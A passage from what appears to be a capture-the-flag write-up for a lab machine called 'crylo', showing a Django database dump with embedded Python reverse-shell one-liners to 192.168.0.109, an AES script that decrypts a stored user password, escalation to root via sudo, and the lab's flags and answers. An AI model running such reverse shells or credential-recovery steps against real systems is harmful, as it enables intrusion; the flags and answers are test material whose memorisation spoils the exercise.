os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'),(12,'about-img_CPFIdyw.jpg','python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),(13,'about-img_GYJ6pZf.jpg','python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\'');
/*!40000 ALTER TABLE `accounts_upload` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group`
--

DROP TABLE IF EXISTS `auth_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_group` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(150) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group`
--

LOCK TABLES `auth_group` WRITE;
/*!40000 ALTER TABLE `auth_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group_permissions`
--

DROP TABLE IF EXISTS `auth_group_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_group_permissions` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `group_id` int NOT NULL,
  `permission_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_group_permissions_group_id_permission_id_0cd325b0_uniq` (`group_id`,`permission_id`),
  KEY `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` (`permission_id`),
  CONSTRAINT `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_group_permissions_group_id_b120cbf9_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group_permissions`
--

LOCK TABLES `auth_group_permissions` WRITE;
/*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_permission`
--

DROP TABLE IF EXISTS `auth_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_permission` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content_type_id` int NOT NULL,
  `codename` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_permission_content_type_id_codename_01ab375a_uniq` (`content_type_id`,`codename`),
  CONSTRAINT `auth_permission_content_type_id_2f476e4b_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_permission`
--

LOCK TABLES `auth_permission` WRITE;
/*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */;
INSERT INTO `auth_permission` VALUES (1,'Can add log entry',1,'add_logentry'),(2,'Can change log entry',1,'change_logentry'),(3,'Can delete log entry',1,'delete_logentry'),(4,'Can view log entry',1,'view_logentry'),(5,'Can add permission',2,'add_permission'),(6,'Can change permission',2,'change_permission'),(7,'Can delete permission',2,'delete_permission'),(8,'Can view permission',2,'view_permission'),(9,'Can add group',3,'add_group'),(10,'Can change group',3,'change_group'),(11,'Can delete group',3,'delete_group'),(12,'Can view group',3,'view_group'),(13,'Can add user',4,'add_user'),(14,'Can change user',4,'change_user'),(15,'Can delete user',4,'delete_user'),(16,'Can view user',4,'view_user'),(17,'Can add content type',5,'add_contenttype'),(18,'Can change content type',5,'change_contenttype'),(19,'Can delete content type',5,'delete_contenttype'),(20,'Can view content type',5,'view_contenttype'),(21,'Can add session',6,'add_session'),(22,'Can change session',6,'change_session'),(23,'Can delete session',6,'delete_session'),(24,'Can view session',6,'view_session'),(25,'Can add pin',7,'add_pin'),(26,'Can change pin',7,'change_pin'),(27,'Can delete pin',7,'delete_pin'),(28,'Can view pin',7,'view_pin'),(29,'Can add pin token',8,'add_pintoken'),(30,'Can change pin token',8,'change_pintoken'),(31,'Can delete pin token',8,'delete_pintoken'),(32,'Can view pin token',8,'view_pintoken'),(33,'Can add upload',9,'add_upload'),(34,'Can change upload',9,'change_upload'),(35,'Can delete upload',9,'delete_upload'),(36,'Can view upload',9,'view_upload');
/*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user`
--

DROP TABLE IF EXISTS `auth_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user` (
  `id` int NOT NULL AUTO_INCREMENT,
  `password` varchar(128) NOT NULL,
  `last_login` datetime(6) DEFAULT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `username` varchar(150) NOT NULL,
  `first_name` varchar(150) NOT NULL,
  `last_name` varchar(150) NOT NULL,
  `email` varchar(254) NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `date_joined` datetime(6) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user`
--

LOCK TABLES `auth_user` WRITE;
/*!40000 ALTER TABLE `auth_user` DISABLE KEYS */;
INSERT INTO `auth_user` VALUES (1,'pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=','2021-10-03 13:33:20.556170',1,'admin','','','admin@admin.com',1,1,'2021-10-02 14:06:18.062959'),(2,'VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1V0=','2021-10-02 14:25:55.934327',1,'anof','','','anof@admin.com',1,1,'2021-10-02 14:14:30.813498');
/*!40000 ALTER TABLE `auth_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_groups`
--

DROP TABLE IF EXISTS `auth_user_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user_groups` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `group_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_groups_user_id_group_id_94350c0c_uniq` (`user_id`,`group_id`),
  KEY `auth_user_groups_group_id_97559544_fk_auth_group_id` (`group_id`),
  CONSTRAINT `auth_user_groups_group_id_97559544_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`),
  CONSTRAINT `auth_user_groups_user_id_6a12ed8b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_groups`
--

LOCK TABLES `auth_user_groups` WRITE;
/*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_user_permissions`
--

DROP TABLE IF EXISTS `auth_user_user_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user_user_permissions` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `permission_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_user_permissions_user_id_permission_id_14a6b632_uniq` (`user_id`,`permission_id`),
  KEY `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` (`permission_id`),
  CONSTRAINT `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_user_user_permissions_user_id_a95ead1b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_user_permissions`
--

LOCK TABLES `auth_user_user_permissions` WRITE;
/*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_admin_log`
--

DROP TABLE IF EXISTS `django_admin_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_admin_log` (
  `id` int NOT NULL AUTO_INCREMENT,
  `action_time` datetime(6) NOT NULL,
  `object_id` longtext,
  `object_repr` varchar(200) NOT NULL,
  `action_flag` smallint unsigned NOT NULL,
  `change_message` longtext NOT NULL,
  `content_type_id` int DEFAULT NULL,
  `user_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `django_admin_log_content_type_id_c4bce8eb_fk_django_co` (`content_type_id`),
  KEY `django_admin_log_user_id_c564eba6_fk_auth_user_id` (`user_id`),
  CONSTRAINT `django_admin_log_content_type_id_c4bce8eb_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`),
  CONSTRAINT `django_admin_log_user_id_c564eba6_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`),
  CONSTRAINT `django_admin_log_chk_1` CHECK ((`action_flag` >= 0))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_admin_log`
--

LOCK TABLES `django_admin_log` WRITE;
/*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_admin_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_content_type`
--

DROP TABLE IF EXISTS `django_content_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_content_type` (
  `id` int NOT NULL AUTO_INCREMENT,
  `app_label` varchar(100) NOT NULL,
  `model` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `django_content_type_app_label_model_76bd3d3b_uniq` (`app_label`,`model`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_content_type`
--

LOCK TABLES `django_content_type` WRITE;
/*!40000 ALTER TABLE `django_content_type` DISABLE KEYS */;
INSERT INTO `django_content_type` VALUES (7,'accounts','pin'),(8,'accounts','pintoken'),(9,'accounts','upload'),(1,'admin','logentry'),(3,'auth','group'),(2,'auth','permission'),(4,'auth','user'),(5,'contenttypes','contenttype'),(6,'sessions','session');
/*!40000 ALTER TABLE `django_content_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_migrations`
--

DROP TABLE IF EXISTS `django_migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_migrations` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `app` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `applied` datetime(6) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_migrations`
--

LOCK TABLES `django_migrations` WRITE;
/*!40000 ALTER TABLE `django_migrations` DISABLE KEYS */;
INSERT INTO `django_migrations` VALUES (1,'contenttypes','0001_initial','2021-10-02 13:57:22.996072'),(2,'auth','0001_initial','2021-10-02 13:57:23.177798'),(3,'accounts','0001_initial','2021-10-02 13:57:23.213792'),(4,'accounts','0002_pintoken','2021-10-02 13:57:23.239012'),(5,'accounts','0003_upload','2021-10-02 13:57:23.247147'),(6,'accounts','0004_upload_id1','2021-10-02 13:57:23.255255'),(7,'admin','0001_initial','2021-10-02 13:57:23.305569'),(8,'admin','0002_logentry_remove_auto_add','2021-10-02 13:57:23.312647'),(9,'admin','0003_logentry_add_action_flag_choices','2021-10-02 13:57:23.318566'),(10,'contenttypes','0002_remove_content_type_name','2021-10-02 13:57:23.354928'),(11,'auth','0002_alter_permission_name_max_length','2021-10-02 13:57:23.378038'),(12,'auth','0003_alter_user_email_max_length','2021-10-02 13:57:23.395005'),(13,'auth','0004_alter_user_username_opts','2021-10-02 13:57:23.403673'),(14,'auth','0005_alter_user_last_login_null','2021-10-02 13:57:23.426103'),(15,'auth','0006_require_contenttypes_0002','2021-10-02 13:57:23.428402'),(16,'auth','0007_alter_validators_add_error_messages','2021-10-02 13:57:23.435125'),(17,'auth','0008_alter_user_username_max_length','2021-10-02 13:57:23.526848'),(18,'auth','0009_alter_user_last_name_max_length','2021-10-02 13:57:23.554626'),(19,'auth','0010_alter_group_name_max_length','2021-10-02 13:57:23.567549'),(20,'auth','0011_update_proxy_permissions','2021-10-02 13:57:23.574274'),(21,'auth','0012_alter_user_first_name_max_length','2021-10-02 13:57:23.599703'),(22,'sessions','0001_initial','2021-10-02 13:57:23.611884');
/*!40000 ALTER TABLE `django_migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_session`
--

DROP TABLE IF EXISTS `django_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_session` (
  `session_key` varchar(40) NOT NULL,
  `session_data` longtext NOT NULL,
  `expire_date` datetime(6) NOT NULL,
  PRIMARY KEY (`session_key`),
  KEY `django_session_expire_date_a5c62663` (`expire_date`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_session`
--

LOCK TABLES `django_session` WRITE;
/*!40000 ALTER TABLE `django_session` DISABLE KEYS */;
INSERT INTO `django_session` VALUES ('0h40eymby4c2711xgdnzytlbb4l1tvh0','.eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1mX1cG:1rsDJloMG92YvqwV5mTSb_7pqLWLJQXm1JbQRGWHwhY','2021-10-17 13:33:20.558410'),('jozmv8z1yy0lw0wfspiflxa6yd9m632l','.eJxVjDsOwjAQBe_iGln-BS-U9JzBWnt3cQA5UpxUiLtDpBTQvpl5L5VwXWpaO89pJHVWTh1-t4zlwW0DdMd2m3SZ2jKPWW-K3mnX14n4edndv4OKvX5rKA7AR0RLhgQgeCBjPVtGAMmSjZeIA8ToAguYQDaa4STogo-Fj-r9Ad_xN7E:1mWfxb:pxt69Z1N_UAAWUO6wtH_LW7-4TRAjt9qaPO3MFYGOGw','2021-10-16 14:25:55.937601'),('yfeyhxt4bm17g2i9j4hy54py3clzh7yj','.eJxVjEEOwiAQAP_C2RCgLGw9eu8byLJsbdXQpLQn499Nkx70OjOZt0q0b1Pam6xpLuqqrLr8skz8lHqI8qB6XzQvdVvnrI9En7bpYSnyup3t32CiNh3bDKNB6CIGwww9xh6Eejv66LMhixBLF4KjKDiiR-c5sPXsxHERAvX5Ar4CN1c:1mWyuE:PUd-sMqktTogLEuri6wFhU0xr65WvMQpKng-wvGBMPQ','2021-10-17 10:39:42.664410');
/*!40000 ALTER TABLE `django_session` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-07-22  8:24:50

┌──(witty㉿kali)-[~]
└─$ cat enc.py
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode
import base64

data = b'toor'   # 9 bytes
key = b'\xc9;\xd4b\xce\xc15\x19;\x00Z^Nw\xafp\x10\xce/r\x0c\xf1\x1c&\x1c\x12a\xd9&b"\xc3'
iv = b'!6\x0b\xc7Xg@\xcc\xe3KY\xcfN\x9b\x81\x91'

# from VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1V0= base64 to hex
password = b'\x54\x7e\x87\x8f\x8f\x9e\x42\x7e\x6e\x60\x65\x40\xc7\x2f\x07\xb7\xba\x64\x54\xef\x68\x78\xf5\x29\x10\xb0\xdd\x89\x71\x6a\xd5\x5d'

cipher1 = AES.new(key, AES.MODE_CBC, iv)
cipher2 = AES.new(key, AES.MODE_CBC, iv)
ct = cipher1.encrypt(pad(data, 16))
plain = cipher2.decrypt(pad(ct, 16))

cipher3 = AES.new(key, AES.MODE_CBC, iv)
plain_pass = cipher3.decrypt(pad(password, 16))

print(ct)
print(plain)
print(plain_pass)
                                                                        
┌──(witty㉿kali)-[~]
└─$ python3 enc.py
b'\x9f\xc9P\xff\xb3Z\x94\x84\x8a\xeb1\xa2/\xba\x8d\xa5'
b"toor\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x81X\xe782\x7fG\x1a\xdcDk\x0b\x17'*\xb8"
b'@Pass123@666666666\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\xa4\xf5\xe3(\xe9]&\xb7F\x1f\x87 I\xf7r@'

crylo@crylo:/home/anof$ su anof
su anof
Password: @Pass123@666666666

anof@crylo:~$ sudo /bin/bash
sudo /bin/bash
[sudo] password for anof: @Pass123@666666666

root@crylo:/home/anof# cd /root
cd /root
root@crylo:~# ls
ls
flag.txt  snap
root@crylo:~# cat flag.txt
cat flag.txt
201ea4139d9755d6c9384783df06dc7e


```

![[Pasted image 20230813155010.png]]

What is the name of the vulnerability used to gain system access?

Check for portswigger Issue Definitions

*OS Command Injection*

What is the current system’s username?

*crylo*

What is the user flag?

*fa3e352b00adf9d4e967ad0e34d5e59d*

Which user is part of the sudo group?

*anof*

What is the password for the above user?

*@Pass123@666666666*

What is the root flag?

*201ea4139d9755d6c9384783df06dc7e*


[[CVE-2023-38408]]